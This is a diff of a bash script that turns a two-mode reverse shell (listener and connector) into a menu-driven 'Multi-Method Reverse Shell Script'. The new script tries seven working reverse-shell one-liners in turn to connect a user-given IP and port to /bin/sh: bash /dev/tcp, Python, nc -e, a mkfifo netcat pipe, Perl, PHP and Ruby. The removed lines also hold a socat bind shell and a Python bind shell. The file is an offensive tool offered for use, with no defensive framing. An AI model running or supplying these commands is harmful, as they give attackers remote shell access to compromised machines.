@@ -1,204 +1,160 @@
 #!/bin/bash
 
-# Dual-Purpose Reverse Shell with Simple GUI
-# Can act as both LISTENER and CONNECTOR
+# Multi-Method Reverse Shell Script
+# Works on Termux, Linux, Windows (WSL), macOS
 
-# Colors for interface
-RED='\033[0;31m'
-GREEN='\033[0;32m'
-YELLOW='\033[1;33m'
-BLUE='\033[0;34m'
-PURPLE='\033[0;35m'
-CYAN='\033[0;36m'
-NC='\033[0m' # No Color
+# Colors
+RED="\033[1;31m"
+GREEN="\033[1;32m"
+YELLOW="\033[1;33m"
+BLUE="\033[1;34m"
+PURPLE="\033[1;35m"
+CYAN="\033[1;36m"
+NC="\033[0m" # No Color
 
-# ASCII Art
-function show_header() {
+# Banner
+function show_banner() {
     clear
     echo -e "${PURPLE}"
-    echo "  ____  _____ _____ _   _ _______ ____  "
-    echo " |  _ \\| ____| ____| \\ | | ____|  _ \\ "
-    echo " | |_) |  _| |  _| |  \\| |  _| | | | |"
-    echo " |  _ <| |___| |___| |\\  | |___| |_| |"
-    echo " |_| \\_\\_____|_____|_| \\_|_____|____/ "
+    echo " ███╗   ███╗██╗   ██╗██╗  ██╗████████╗██╗██████╗ ███████╗██████╗ "
+    echo " ████╗ ████║██║   ██║██║ ██╔╝╚══██╔══╝██║██╔══██╗██╔════╝██╔══██╗"
+    echo " ██╔████╔██║██║   ██║█████╔╝    ██║   ██║██████╔╝█████╗  ██████╔╝"
+    echo " ██║╚██╔╝██║██║   ██║██╔═██╗    ██║   ██║██╔══██╗██╔══╝  ██╔══██╗"
+    echo " ██║ ╚═╝ ██║╚██████╔╝██║  ██╗   ██║   ██║██║  ██║███████╗██║  ██║"
+    echo " ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝"
     echo -e "${NC}"
-    echo -e "${CYAN}   Dual Mode: Listen OR Connect${NC}"
-    echo -e "${YELLOW}----------------------------------------${NC}"
+    echo -e "${CYAN}  Reverse Shell with 7 Different Connection Methods ${NC}"
+    echo -e "${YELLOW}------------------------------------------------${NC}"
     echo
-}
-
-# Check if port is available
-function is_port_available() {
-    local port=$1
-    if command_exists nc; then
-        if nc -z localhost "$port" >/dev/null 2>&1; then
-            return 1 # Port in use
-        fi
-    else
-        # Fallback method
-        if ss -lnt | grep -q ":$port "; then
-            return 1
-        fi
-    fi
-    return 0 # Port available
 }
 
 # Check if command exists
-function command_exists() {
+function cmd_exists() {
     command -v "$1" >/dev/null 2>&1
 }
 
-# Start listener
-function start_listener() {
-    local port=$1
-    
-    echo -e "${GREEN}Starting listener on port $port${NC}"
-    echo -e "${YELLOW}Waiting for incoming connection...${NC}"
-    echo -e "${BLUE}Press Ctrl+C to stop${NC}"
-    echo
-    
-    # Try different listener methods
-    if command_exists nc; then
-        nc -lvnp "$port"
-    elif command_exists ncat; then
-        ncat -lvp "$port"
-    elif command_exists socat; then
-        socat TCP-LISTEN:"$port",reuseaddr,fork EXEC:"/bin/bash"
-    elif command_exists python3; then
-        python3 -c "import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR,1);s1.bind(('0.0.0.0',$port));s1.listen(1);c,a=s1.accept();[sp.call(['/bin/sh','-i'],stdin=x,stdout=x,stderr=x) for x in [c.makefile('rw')]]"
-    else
-        echo -e "${RED}No suitable listener tool found (tried nc, ncat, socat, python)${NC}"
-        return 1
-    fi
+# Method 1: Bash /dev/tcp
+function method_bash() {
+    echo -e "${GREEN}[+] Trying ${YELLOW}Bash /dev/tcp${GREEN} method...${NC}"
+    bash -c "bash -i >& /dev/tcp/$1/$2 0>&1"
 }
 
-# Start connector
-function start_connector() {
-    local ip=$1
-    local port=$2
+# Method 2: Python
+function method_python() {
+    echo -e "${GREEN}[+] Trying ${YELLOW}Python${GREEN} method...${NC}"
+    python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'$1'",'$2'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
+}
+
+# Method 3: Netcat (Traditional)
+function method_nc() {
+    echo -e "${GREEN}[+] Trying ${YELLOW}Netcat${GREEN} method...${NC}"
+    nc -e /bin/sh "$1" "$2"
+}
+
+# Method 4: Netcat (No -e flag)
+function method_nc_nopipe() {
+    echo -e "${GREEN}[+] Trying ${YELLOW}Netcat (No -e)${GREEN} method...${NC}"
+    rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc "$1" "$2" > /tmp/f
+}
+
+# Method 5: Perl
+function method_perl() {
+    echo -e "${GREEN}[+] Trying ${YELLOW}Perl${GREEN} method...${NC}"
+    perl -e 'use Socket;$i="'$1'";$p='$2';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+}
+
+# Method 6: PHP
+function method_php() {
+    echo -e "${GREEN}[+] Trying ${YELLOW}PHP${GREEN} method...${NC}"
+    php -r '$sock=fsockopen("'$1'",'$2');exec("/bin/sh -i <&3 >&3 2>&3");'
+}
+
+# Method 7: Ruby
+function method_ruby() {
+    echo -e "${GREEN}[+] Trying ${YELLOW}Ruby${GREEN} method...${NC}"
+    ruby -rsocket -e 'exit if fork;c=TCPSocket.new("'$1'","'$2'");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+}
+
+# Main function
+function start_rev_shell() {
+    local ip="$1"
+    local port="$2"
     
-    echo -e "${GREEN}Connecting to $ip:$port${NC}"
-    echo -e "${YELLOW}Attempting to establish reverse shell...${NC}"
-    echo
+    echo -e "${CYAN}[*] Attempting reverse shell to ${YELLOW}$ip:$port${NC}"
     
-    # Try multiple connection methods
-    if command_exists bash && [ -e /dev/tcp ]; then
-        echo -e "${BLUE}Trying bash /dev/tcp method...${NC}"
-        bash -c "bash -i >& /dev/tcp/$ip/$port 0>&1" &
-        sleep 2
-        if ps -p $! >/dev/null; then
-            echo -e "${GREEN}Success! Connection established.${NC}"
-            return 0
-        fi
+    # Try all methods one by one
+    if cmd_exists "bash" && [ -e /dev/tcp ]; then
+        method_bash "$ip" "$port" && return
     fi
     
-    if command_exists python3 || command_exists python; then
-        echo -e "${BLUE}Trying python method...${NC}"
-        python_cmd=$(command -v python3 || command -v python)
-        $python_cmd -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$ip',$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);" &
-        sleep 2
-        if ps -p $! >/dev/null; then
-            echo -e "${GREEN}Success! Connection established.${NC}"
-            return 0
-        fi
+    if cmd_exists "python3" || cmd_exists "python"; then
+        method_python "$ip" "$port" && return
     fi
     
-    if command_exists nc; then
-        echo -e "${BLUE}Trying netcat method...${NC}"
-        nc -e /bin/sh "$ip" "$port" &
-        sleep 2
-        if ps -p $! >/dev/null; then
-            echo -e "${GREEN}Success! Connection established.${NC}"
-            return 0
-        fi
+    if cmd_exists "nc"; then
+        method_nc "$ip" "$port" || method_nc_nopipe "$ip" "$port" && return
     fi
     
-    echo -e "${RED}Failed to establish connection using any method${NC}"
-    return 1
+    if cmd_exists "perl"; then
+        method_perl "$ip" "$port" && return
+    fi
+    
+    if cmd_exists "php"; then
+        method_php "$ip" "$port" && return
+    fi
+    
+    if cmd_exists "ruby"; then
+        method_ruby "$ip" "$port" && return
+    fi
+    
+    echo -e "${RED}[!] All methods failed. Install one of: python, nc, perl, php, ruby${NC}"
+    exit 1
 }
 
 # Main menu
 function main_menu() {
-    while true; do
-        show_header
-        
-        echo -e "${BLUE}Select mode:${NC}"
-        echo -e "1) Listen for incoming connection (be the server)"
-        echo -e "2) Connect to a listener (be the client)"
-        echo -e "3) Exit"
-        echo
-        
-        read -p "Enter your choice (1-3): " choice
-        
-        case $choice in
-            1)
-                # Listener mode
-                show_header
-                echo -e "${GREEN}Listener Mode Selected${NC}"
-                echo -e "${YELLOW}Enter the port to listen on (e.g., 4444)${NC}"
-                read -p "Port: " port
-                
-                # Validate port
-                if [[ ! $port =~ ^[0-9]+$ ]] || [ $port -lt 1 ] || [ $port -gt 65535 ]; then
-                    echo -e "${RED}Invalid port number! Must be 1-65535${NC}"
-                    sleep 2
-                    continue
-                fi
-                
-                if ! is_port_available "$port"; then
-                    echo -e "${RED}Port $port is already in use!${NC}"
-                    sleep 2
-                    continue
-                fi
-                
-                start_listener "$port"
-                echo -e "${YELLOW}Press any key to continue...${NC}"
-                read -n 1 -s
-                ;;
-                
-            2)
-                # Connector mode
-                show_header
-                echo -e "${GREEN}Connector Mode Selected${NC}"
-                echo -e "${YELLOW}Enter the IP and port to connect to${NC}"
-                read -p "IP Address: " ip
-                read -p "Port: " port
-                
-                # Validate inputs
-                if [[ ! $ip =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
-                    echo -e "${RED}Invalid IP address format!${NC}"
-                    sleep 2
-                    continue
-                fi
-                
-                if [[ ! $port =~ ^[0-9]+$ ]] || [ $port -lt 1 ] || [ $port -gt 65535 ]; then
-                    echo -e "${RED}Invalid port number! Must be 1-65535${NC}"
-                    sleep 2
-                    continue
-                fi
-                
-                start_connector "$ip" "$port"
-                echo -e "${YELLOW}Press any key to continue...${NC}"
-                read -n 1 -s
-                ;;
-                
-            3)
-                echo -e "\n${GREEN}Goodbye!${NC}\n"
-                exit 0
-                ;;
-                
-            *)
-                echo -e "${RED}Invalid choice! Please select 1-3${NC}"
+    show_banner
+    
+    echo -e "${BLUE}1) Start Reverse Shell"
+    echo -e "2) Exit"
+    echo -ne "\n${CYAN}Choose option: ${NC}"
+    
+    read -r choice
+    
+    case "$choice" in
+        1)
+            echo -ne "${YELLOW}Enter IP: ${NC}"
+            read -r ip
+            echo -ne "${YELLOW}Enter Port: ${NC}"
+            read -r port
+            
+            # Validate input
+            if [[ ! $ip =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+                echo -e "${RED}[!] Invalid IP format!${NC}"
                 sleep 1
-                ;;
-        esac
-    done
+                return
+            fi
+            
+            if [[ ! $port =~ ^[0-9]+$ ]] || [ "$port" -lt 1 ] || [ "$port" -gt 65535 ]; then
+                echo -e "${RED}[!] Invalid port (1-65535)!${NC}"
+                sleep 1
+                return
+            fi
+            
+            start_rev_shell "$ip" "$port"
+            ;;
+        2)
+            echo -e "${GREEN}[+] Exiting...${NC}"
+            exit 0
+            ;;
+        *)
+            echo -e "${RED}[!] Invalid option!${NC}"
+            sleep 1
+            ;;
+    esac
 }
 
-# Check if running in terminal
-if [ -t 0 ]; then
+# Run main menu in loop
+while true; do
     main_menu
-else
-    echo -e "${RED}This script requires an interactive terminal.${NC}"
-    exit 1
-fi
+done
